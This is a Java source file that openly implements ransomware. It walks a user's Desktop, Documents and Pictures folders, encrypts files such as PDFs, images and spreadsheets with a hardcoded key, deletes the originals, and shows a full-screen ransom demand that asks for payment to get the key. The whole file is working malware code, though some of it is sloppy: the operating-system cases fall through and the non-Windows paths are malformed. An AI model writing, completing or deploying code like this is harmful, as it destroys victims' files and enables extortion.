package com.company;

import org.apache.commons.io.FileUtils;
import org.omg.Messaging.SyncScopeHelper;

import java.io.*;
import java.util.*;
import java.awt.*;
import java.awt.event.*;
import java.util.List;
import javax.swing.*;
import javax.swing.plaf.FontUIResource;


public class Main {

    static JFrame frame ;   // for creating graphical forms in java
    static JLabel l1 ;    // for holding a text

    public enum OS {
            WINDOWS, LINUX, MAC, SOLARIS
    };

    private static OS os = null;

    public static String key = "RgUkXp2s5v8y/A?D";  // 128 bit key

    public static void main(String[] args) {

        FileFinder();   // finding the files that we asked for and encrypting them
        Warning();      // asking for a key for decrypting the files content


    }


    public static void FileFinder(){                //  finding the files that we asked for and encrypting them
        List<String> PathList = new ArrayList<String>();
        switch (getOperationSystem()){     // we will detect which operation system the user have and will act correspondingly

            case WINDOWS:
                PathList.add(System.getProperty("user.home") + "\\Desktop");
                PathList.add(System.getProperty("user.home") + "\\Documents");
                PathList.add(System.getProperty("user.home") + "\\Pictures");

            case LINUX:
                PathList.add(System.getProperty("user.home") + "\\home\\Desktop");
                PathList.add(System.getProperty("user.home") + "\\home\\Documents");
                PathList.add(System.getProperty("user.home") + "\\home\\Pictures");

            case MAC:
                PathList.add(System.getProperty("user.home") + "\\Users\\Desktop");
                PathList.add(System.getProperty("user.home") + "\\Users\\Documents");
                PathList.add(System.getProperty("user.home") + "\\Users\\Pictures");

            case SOLARIS:
                PathList.add(System.getProperty("user.home") + "\\Usr\\Desktop");
                PathList.add(System.getProperty("user.home") + "\\Usr\\Documents");
                PathList.add(System.getProperty("user.home") + "\\Usr\\Pictures");
        }

        for(String relevantDirectory : PathList){         // the loop will run on each directory from the List
                    // the list include all the important directories that we want to scan
                    File root = new File(relevantDirectory);
                    try{
                        String[] FileTypes = { "png", "pdf", "docs",  "txt", "zip", "rar", "jpg", "xls" };   //a list with all the files type that we will ask to encrypt
                        Collection files = FileUtils.listFiles(root, FileTypes, true);     // scanning the directory and gather the files

                        for( Object object: files){     // encrypting all the files
                    File f =(File) object;
                    Encryptor(f.getAbsolutePath());

                }
            }
            catch(Exception e){
                e.fillInStackTrace();
            }
        }

    }


    public static void FileFinder(String type){
        List<String> PathList = new ArrayList<String>();
        switch (getOperationSystem()){     // we will detect which operation system the user have and will act correspondingly

            case WINDOWS:
                PathList.add(System.getProperty("user.home") + "\\Desktop");
                PathList.add(System.getProperty("user.home") + "\\Documents");
                PathList.add(System.getProperty("user.home") + "\\Pictures");

            case LINUX:
                PathList.add(System.getProperty("user.home") + "\\home\\Desktop");
                PathList.add(System.getProperty("user.home") + "\\home\\Documents");
                PathList.add(System.getProperty("user.home") + "\\home\\Pictures");

            case MAC:
                PathList.add(System.getProperty("user.home") + "\\Users\\Desktop");
                PathList.add(System.getProperty("user.home") + "\\Users\\Documents");
                PathList.add(System.getProperty("user.home") + "\\Users\\Pictures");

            case SOLARIS:
                PathList.add(System.getProperty("user.home") + "\\Usr\\Desktop");
                PathList.add(System.getProperty("user.home") + "\\Usr\\Documents");
                PathList.add(System.getProperty("user.home") + "\\Usr\\Pictures");
        }

        for(String relevantDirectory : PathList){           // the loop will run on each directory from the List
                                                            // the list include all the important directories that we want to scan
            File root = new File(relevantDirectory);
            try{
                String[] FileTypes = { type };      // the type of extension that we will search
                                                    // in other words we will look for .encrypted files
                Collection files= FileUtils.listFiles(root, FileTypes, true);  // scanning the directory and gather the files

                for( Object object: files){         // decrypt all the files
                    File f =(File) object;
                    Decryptor(f.getAbsolutePath());
                }
            }
            catch(Exception e){
                e.fillInStackTrace();
            }
        }

    }




    public static void Encryptor(String CurrFilePath){          // encrypt the file
        File targetFile= new File(CurrFilePath);
        File encryptedTargetFile = new File(CurrFilePath+ ".encrypted"); // create a new file with the same content
        try{
            CryptoUtils.encrypt(key ,targetFile ,encryptedTargetFile);   // encrypt the new fill

        }catch (CryptoException ex) {
            ex.printStackTrace();
        }

        targetFile.delete();   // delete the original file

    }



    public static void Decryptor(String CurrentEncryptedFilePath){      //  decrypt the fill
        File targetFile= new File(CurrentEncryptedFilePath);
        File decryptedTargetFile = new File(CurrentEncryptedFilePath+ ".decrypted"); // create a new file with the same content

        try{
            CryptoUtils.decrypt(key,targetFile,decryptedTargetFile); // decrypt the new file

        }catch (CryptoException e) {
            e.printStackTrace();
        }

        targetFile.delete();        // delete the encrypted file
        String s= decryptedTargetFile.getAbsolutePath();
        File d1 = new File(s.substring(0,s.length()-20));
        decryptedTargetFile.renameTo(d1);       // erasing the extensions from the file path, in other words erasing ".encrypted.decrypted"

    }





    public static void Warning(){               // creating a ransom massage
         frame= new JFrame("warning massage") ;
         l1= new JLabel ();
         l1.setFont(new Font("Serif", Font.BOLD, 40));
         l1.setText("<html>Warning: All your important files are encrypted, in order to get the key for decrypt these files <br/> you should contact us and pay the ransom,  " +
         " after that you will get the key for decrypt and restore your files!<html>");

         JPanel p = new JPanel();
         p.add(l1);
         frame.add(p);


         JPanel panel= new JPanel();

         JLabel label= new JLabel("Enter your key password :");
         label.setFont(new Font("Serif", Font.BOLD, 30));
         JTextField tf= new JTextField(15);
         tf.setFont(new Font("Serif", Font.BOLD, 30));

         JButton submit = new JButton ("Restore my files");        // a button that checking if the input key is correct
         submit.setFont(new Font("Serif", Font.BOLD, 30));

         submit.addActionListener(new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {

                 String strVictimKey = tf.getText();
                 if(strVictimKey.equalsIgnoreCase(key)){        // if the key correct we will decrypt the content of the files
                     JOptionPane.showMessageDialog(frame, "the key is true, your files restoring, it's might take a while  ");

                     FileFinder("encrypted");   // decrypt the content of the fill
                 }else {
                     JOptionPane.showMessageDialog(frame, "the key is wrong, be careful you have just 3 chances! ");
                 }
             }
         });

         JButton reset = new JButton("Reset");
         reset.setFont(new Font("Serif", Font.BOLD, 30));

         panel.add(label);
         panel.add(tf);
         panel.add(submit);
         panel.add(reset);

         frame.getContentPane().add(BorderLayout.SOUTH, panel);
         frame.setVisible(true);
         frame.setExtendedState(JFrame.MAXIMIZED_BOTH);
         frame.setUndecorated(true);
         frame.setVisible(true);

    }





    public static OS getOperationSystem(){              // function that discover the operation system of the user
        if(os==null){
            String operationSystem = System.getProperty("os.name").toLowerCase();
            if(operationSystem.contains("win")){        // all windows operating system have almost the same structure files
                os=OS.WINDOWS;
            } else if(operationSystem.contains("nix") || operationSystem.contains("nux") || operationSystem.contains("aix") ) {
                        os=OS.LINUX;
                    } else if(operationSystem.contains("mac")){
                             os=OS.MAC;
                                }
                            else if(operationSystem.contains("sunos")){         // solaris operating system
                                    os=OS.SOLARIS;
                                    }
        }
        return os;
    }
}
